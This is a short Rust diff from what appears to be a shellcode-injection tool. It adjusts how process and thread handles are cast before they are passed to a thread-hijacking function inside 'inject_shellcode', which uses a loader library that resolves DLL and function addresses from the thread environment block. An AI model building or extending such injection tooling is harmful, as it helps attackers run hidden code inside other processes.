@@ -1,5 +1,6 @@
 pub use winapi;
 use winapi::um::{processthreadsapi::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA}, winbase::{DEBUG_PROCESS, DETACHED_PROCESS, NORMAL_PRIORITY_CLASS}};
+use winapi::um::winnt::HANDLE as WINAPI_HANDLE;
 
 use noldr::{get_dll_address, get_function_address, get_teb};
 
@@ -153,15 +154,15 @@ fn inject_shellcode(process_name: &str, shellcode: &[u8]) -> Result<String, Stri
     println!("Shellcode location: {:p}", shellcode_location);
     
 
-    //fixed issues with handle types earlier in the program, but now we need to cast the handles to the correct type
-    //for passing to snap_thread_hijack
-    //will fix later. my brain is fried.
+    // Convert both handles to WinAPI HANDLE (*mut c_void)
+    let thread_handle_raw = thread_handle.0 as WINAPI_HANDLE;
+    let process_handle_raw = process_handle.0 as WINAPI_HANDLE;
 
     if !func::snap_thread_hijack(
         pid as u32,
-        thread_handle.0 as _,
+        thread_handle_raw,     // WinAPI HANDLE
         tid as u32,
-        process_handle.0 as _,  // Cast only when needed
+        process_handle_raw,    // WinAPI HANDLE
         Some(shellcode_location),
         None,
     ) {
